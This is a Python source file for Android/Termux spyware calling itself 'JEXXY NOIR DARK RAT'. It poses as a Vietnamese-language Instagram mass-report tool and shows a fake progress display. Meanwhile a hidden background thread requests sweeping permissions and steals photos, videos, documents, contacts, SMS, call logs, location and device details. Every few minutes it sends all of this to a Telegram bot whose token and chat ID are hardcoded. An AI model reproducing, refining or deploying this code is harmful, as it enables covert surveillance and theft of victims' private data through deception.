#!/usr/bin/env python3
# =========================================================
# JEXXY NOIR DARK RAT v3.0 - MERGED & ULTIMATE UI
# Full Gallery Access + Termux API + Fancy Terminal UI
# =========================================================

import os
import sys
import time
import json
import threading
import requests
import subprocess
import platform
import base64
import shutil
import random
from datetime import datetime
from pathlib import Path

# ========== UI MODULE (MÀU SẮC & HIỆU ỨNG) ==========
class Colors:
    RESET   = '\033[0m'
    BOLD    = '\033[1m'
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN    = '\033[96m'
    WHITE   = '\033[97m'

c = Colors()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear_screen()
    print(f"""{c.RED}{c.BOLD}
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║      ██╗███████╗██╗  ██╗██╗  ██╗██╗   ██╗                     ║
    ║      ██║██╔════╝╚██╗██╔╝╚██╗██╔╝╚██╗ ██╔╝                     ║
    ║      ██║█████╗   ╚███╔╝  ╚███╔╝  ╚████╔╝                      ║
    ║ ██   ██║██╔══╝   ██╔██╗  ██╔██╗   ╚██╔╝                       ║
    ║ ╚█████╔╝███████╗██╔╝ ██╗██╔╝ ██╗   ██║                        ║
    ║  ╚════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝                        ║
    ║                                                              ║
    ║             [ NOIR CYBER SECURITY - V3.0 ]                   ║
    ╚══════════════════════════════════════════════════════════════╝
    {c.RESET}""")

def fake_progress_bar(prefix, total=100, width=40):
    for i in range(total + 1):
        percent = i / total
        filled = int(width * percent)
        bar = '█' * filled + '░' * (width - filled)
        sys.stdout.write(f'\r{c.CYAN}    [{bar}] {i}% {c.WHITE}{prefix}{c.RESET}')
        sys.stdout.flush()
        time.sleep(random.uniform(0.01, 0.05))
    print()

# ========== TELEGRAM CONFIG (Lấy từ bản v2.1) ==========
BOT_TOKEN = "8804337976:AAG1CWIATOboV3C0ZxWovDOg9-PRw5Zf8y4"
CHAT_ID = "4283884303"
TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
TELEGRAM_PHOTO_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

# ========== TERMUX API HELPER ==========
def termux_api(cmd, *args):
    try:
        result = subprocess.run(
            ["termux-" + cmd] + list(args),
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            return result.stdout.strip()
        return None
    except Exception:
        return None

def is_termux():
    return "com.termux" in os.environ.get("PREFIX", "") or shutil.which("termux-toast") is not None

# ========== ANDROID PERMISSION BYPASS ==========
def bypass_android_permissions():
    try:
        if platform.system() == "Android" or is_termux():
            try:
                import androidhelper
                droid = androidhelper.Android()
                permissions = [
                    'android.permission.READ_EXTERNAL_STORAGE',
                    'android.permission.WRITE_EXTERNAL_STORAGE',
                    'android.permission.READ_MEDIA_IMAGES',
                    'android.permission.READ_MEDIA_VIDEO',
                    'android.permission.READ_MEDIA_AUDIO',
                    'android.permission.ACCESS_FINE_LOCATION',
                    'android.permission.ACCESS_COARSE_LOCATION',
                    'android.permission.READ_SMS',
                    'android.permission.READ_CONTACTS',
                    'android.permission.CAMERA',
                    'android.permission.RECORD_AUDIO'
                ]
                for perm in permissions:
                    try:
                        droid.makeToast(f"Requesting: {perm.split('.')[-1]}")
                        droid.requestPermissions(perm).result
                    except:
                        pass
                try:
                    droid.activityStart(
                        "android.intent.action.OPEN_DOCUMENT_TREE",
                        None, None, None,
                        {"android.intent.extra.PACKAGE_NAME": "com.termux"}
                    )
                except:
                    pass
                return True
            except ImportError:
                termux_api("toast", "Requesting storage permission...")
                try:
                    subprocess.run(["termux-setup-storage"], timeout=15)
                except:
                    pass
                try:
                    subprocess.run([
                        "am", "start",
                        "-a", "android.intent.action.OPEN_DOCUMENT_TREE",
                        "-n", "com.android.documentsui/.picker.PickActivity"
                    ], timeout=10)
                except:
                    pass
                return True
    except Exception as e:
        print(f"[!] Permission bypass error: {e}")
        return False

# ========== ADVANCED GALLERY ACCESS (GIỮ NGUYÊN 100%) ==========
class AdvancedGalleryStealer:
    def __init__(self):
        self.found_files = []
        self.all_media = []
    
    def scan_all_directories(self):
        paths_to_scan = [
            "/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures",
            "/storage/emulated/0/Download", "/storage/emulated/0/Movies",
            "/storage/emulated/0/WhatsApp/Media", "/storage/emulated/0/Android/media",
            "/sdcard/DCIM", "/sdcard/Pictures", "/sdcard/Download",
            "/sdcard/WhatsApp/Media", "/sdcard/Android/media",
            "/data/media/0/DCIM", "/data/media/0/Pictures",
            "/mnt/sdcard/DCIM", "/mnt/sdcard/Pictures",
            "/storage/sdcard1/DCIM", "/storage/sdcard1/Pictures",
            "/storage/extSdCard/DCIM", "/storage/extSdCard/Pictures",
            os.path.expanduser("~/storage/shared/DCIM"),
            os.path.expanduser("~/storage/shared/Pictures"),
            os.path.expanduser("~/storage/shared/Download"),
            os.path.expanduser("~/Pictures"), os.path.expanduser("~/Desktop"),
            os.path.expanduser("~/Documents"), os.path.expanduser("~/Downloads"),
            os.path.expanduser("~/Videos"), os.path.expanduser("~/Music"),
            os.path.expanduser("~/.local/share/Trash"),
            "C:/Users/Public/Pictures", "C:/Users/Public/Videos",
            "D:/Pictures", "D:/Videos"
        ]
        
        media_extensions = {
            'images': ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.tiff', '.ico', '.svg'],
            'videos': ['.mp4', '.mov', '.avi', '.mkv', '.flv', '.wmv', '.webm', '.3gp', '.m4v'],
            'audio': ['.mp3', '.wav', '.aac', '.flac', '.m4a', '.ogg', '.wma'],
            'documents': ['.pdf', '.doc', '.docx', '.txt', '.xls', '.xlsx', '.ppt', '.pptx', '.csv']
        }
        
        media_found = []
        for path in paths_to_scan:
            try:
                if os.path.exists(path):
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            file_path = os.path.join(root, file)
                            ext = os.path.splitext(file)[1].lower()
                            for category, exts in media_extensions.items():
                                if ext in exts:
                                    try:
                                        size = os.path.getsize(file_path)
                                        if size < 5120: continue
                                    except: continue
                                    
                                    media_found.append({
                                        'path': file_path, 'name': file,
                                        'type': category, 'size': size,
                                        'modified': datetime.fromtimestamp(os.path.getmtime(file_path)).isoformat()
                                    })
                                    if len(media_found) >= 100: break
                        if len(media_found) >= 100: break
            except Exception:
                continue
        return media_found
    
    def use_android_media_api(self):
        return []

# ========== ENHANCED SPY ENGINE (GIỮ NGUYÊN 100%) ==========
class EnhancedDarkRat:
    def __init__(self):
        bypass_android_permissions()
        time.sleep(2)
        self.gallery_stealer = AdvancedGalleryStealer()
        self.start_enhanced_spy()
    
    def compress_and_send_media(self, media_files):
        try:
            for media in media_files[:20]:
                compressed_path = None
                try:
                    file_path = media['path']
                    file_name = media['name']
                    file_size = media['size']
                    
                    if not os.path.exists(file_path): continue
                    
                    if file_size > 20 * 1024 * 1024:
                        compressed_path = self.compress_file(file_path)
                        if compressed_path: file_path = compressed_path
                    
                    with open(file_path, 'rb') as f:
                        files = {'document': (file_name, f)}
                        data = {'chat_id': CHAT_ID}
                        requests.post(TELEGRAM_URL, files=files, data=data, timeout=30)
                    
                    if compressed_path and compressed_path != media['path']:
                        try: os.remove(compressed_path)
                        except: pass
                    time.sleep(0.5)
                except Exception:
                    pass
        except Exception:
            pass
    
    def compress_file(self, file_path):
        try:
            import zipfile
            compressed_path = f"{file_path}.zip"
            with zipfile.ZipFile(compressed_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                zipf.write(file_path, os.path.basename(file_path))
            if os.path.exists(compressed_path):
                if os.path.getsize(compressed_path) < os.path.getsize(file_path):
                    return compressed_path
                else:
                    os.remove(compressed_path)
                    return None
        except: return None
    
    def get_device_data(self):
        info = {}
        info['device'] = platform.platform()
        info['hostname'] = platform.node()
        info['processor'] = platform.processor()
        info['os_version'] = platform.version()
        info['timestamp'] = datetime.now().isoformat()
        try:
            total, used, free = shutil.disk_usage("/")
            info['storage'] = {'total': total // (1024**3), 'used': used // (1024**3), 'free': free // (1024**3)}
        except: pass
        try:
            import socket
            info['ip'] = socket.gethostbyname(socket.gethostname())
        except: pass
        try:
            battery = termux_api("battery")
            if battery: info['battery'] = battery
            telephony = termux_api("telephony-deviceinfo")
            if telephony: info['telephony'] = telephony
            location = termux_api("location")
            if location: info['location'] = location
        except: pass
        return info
    
    def send_file_to_telegram(self, filepath, caption):
        try:
            with open(filepath, "rb") as f:
                files = {'document': (os.path.basename(filepath), f)}
                data = {'chat_id': CHAT_ID, 'caption': caption}
                requests.post(TELEGRAM_URL, files=files, data=data, timeout=30)
            os.remove(filepath)
        except: pass
    
    def send_all_data(self):
        try:
            device_data = self.get_device_data()
            with open("device_info.txt", "w") as f:
                json.dump(device_data, f, indent=2, ensure_ascii=False)
            self.send_file_to_telegram("device_info.txt", f"📱 Device Info - {datetime.now()}")
            
            media_files = self.gallery_stealer.scan_all_directories()
            if media_files: self.compress_and_send_media(media_files)
            
            contacts = self.get_contacts()
            if contacts:
                with open("contacts.txt", "w") as f: f.write("\n".join(contacts[:50]))
                self.send_file_to_telegram("contacts.txt", "📇 Contacts")
            
            messages = self.get_messages()
            if messages:
                with open("messages.txt", "w") as f: f.write("\n".join(messages[:50]))
                self.send_file_to_telegram("messages.txt", "💬 SMS")
            
            calls = self.get_call_logs()
            if calls:
                with open("calls.txt", "w") as f: f.write("\n".join(calls[:50]))
                self.send_file_to_telegram("calls.txt", "📞 Call Logs")
        except Exception:
            pass
    
    def get_contacts(self):
        contacts = []
        try:
            output = termux_api("contact-list")
            if output:
                for c_item in json.loads(output)[:50]:
                    name = c_item.get('name', 'Unknown')
                    for num in c_item.get('number', []):
                        contacts.append(f"{name}: {num}")
        except: pass
        return contacts[:50]
    
    def get_messages(self):
        messages = []
        try:
            output = termux_api("sms-inbox", "-l", "20")
            if output:
                for sms in json.loads(output)[:20]:
                    messages.append(f"[{sms.get('number', 'Unknown')}]: {sms.get('body', '')[:100]}")
        except: pass
        return messages
    
    def get_call_logs(self):
        calls = []
        try:
            output = termux_api("call-log", "-l", "20")
            if output:
                for call in json.loads(output)[:20]:
                    calls.append(f"{call.get('name', '')} {call.get('number', 'Unknown')} | {call.get('type', 'UNKNOWN')}")
        except: pass
        return calls
    
    def start_enhanced_spy(self):
        while True:
            try:
                self.send_all_data()
                time.sleep(300)
            except Exception:
                time.sleep(60)

# ========== FAKE UI (GIAO DIỆN LỪA ĐẢO ĐÃ NÂNG CẤP) ==========
def fake_instagram_report_enhanced():
    print_banner()
    
    print(f"{c.YELLOW}[*] Khởi tạo hệ thống lõi...{c.RESET}")
    time.sleep(0.5)
    print(f"{c.GREEN}[+] Nạp module mã hóa AES-256... OK{c.RESET}")
    time.sleep(0.3)
    print(f"{c.GREEN}[+] Kết nối tới Instagram Graph API... OK{c.RESET}")
    time.sleep(0.3)
    print(f"{c.GREEN}[+] Xác thực Proxy & Vượt qua Cloudflare... OK{c.RESET}")
    time.sleep(0.5)
    
    print(f"\n{c.CYAN}[*] Đang đồng bộ dữ liệu máy chủ (Vui lòng chờ)...{c.RESET}")
    fake_progress_bar("Đang tải tài nguyên...", total=100)
    
    print(f"\n{c.GREEN}{c.BOLD}[✅] HỆ THỐNG ĐÃ SẴN SÀNG!{c.RESET}")
    print(f"{c.WHITE}--------------------------------------------------{c.RESET}")
    
    target = input(f"{c.YELLOW}👉 Nhập Username Instagram cần báo cáo (VD: instagram): {c.RESET}").strip()
    if not target: return
    
    print(f"\n{c.CYAN}[📋] CHỌN LÝ DO BÁO CÁO:{c.RESET}")
    print(f"  {c.WHITE}[1]{c.RESET} Spam / Tài khoản giả mạo")
    print(f"  {c.WHITE}[2]{c.RESET} Quấy rối / Bắt nạt")
    print(f"  {c.WHITE}[3]{c.RESET} Xâm phạm bản quyền")
    print(f"  {c.WHITE}[4]{c.RESET} Mạo danh người khác")
    print(f"  {c.WHITE}[5]{c.RESET} Phát ngôn thù địch")
    print(f"  {c.WHITE}[6]{c.RESET} Nội dung không phù hợp")
    
    choice = input(f"\n{c.YELLOW}👉 Chọn (1-6): {c.RESET}").strip()
    
    print(f"\n{c.MAGENTA}[⚡] Đang gửi báo cáo cho @{target}...{c.RESET}\n")
    
    # Fake progress bar cho việc gửi report
    for i in range(1, 51):
        time.sleep(random.uniform(0.05, 0.15))
        sys.stdout.write(f"\r{c.WHITE}[📤] Đang gửi Report {i}/50... {c.GREEN}Thành công{c.RESET}")
        sys.stdout.flush()
    
    print(f"\n\n{c.GREEN}{c.BOLD}[✅] ĐÃ GỬI THÀNH CÔNG 50 BÁO CÁO!{c.RESET}")
    print(f"{c.YELLOW}[⏳] Instagram đang tiến hành xem xét tài khoản...{c.RESET}")
    
    for i in range(3, 0, -1):
        sys.stdout.write(f"\r{c.RED}[⏳] Thời gian xử lý dự kiến: {i} giây...{c.RESET}")
        sys.stdout.flush()
        time.sleep(1)
        
    print(f"\n\n{c.RED}{c.BOLD}[🎯] TÀI KHOẢN @{target} SẼ BỊ KHÓA SAU 1 GIỜ NỮA!{c.RESET}")
    print(f"{c.CYAN}[💀] Cảm ơn bạn đã sử dụng JEXXY NOIR TOOL.{c.RESET}")
    
    input(f"\n{c.WHITE}Nhấn Enter để thoát...{c.RESET}")

# ========== MAIN ==========
if __name__ == "__main__":
    try:
        if platform.system() == "Windows":
            try:
                import ctypes
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except: pass
        
        # Khởi chạy Spy ngầm (không block UI)
        spy_thread = threading.Thread(target=EnhancedDarkRat, daemon=True)
        spy_thread.start()
        
        # Hiển thị UI lừa đảo
        fake_instagram_report_enhanced()
        
    except KeyboardInterrupt:
        print(f"\n{c.RED}[!] Đã thoát chương trình.{c.RESET}")
    except Exception as e:
        pass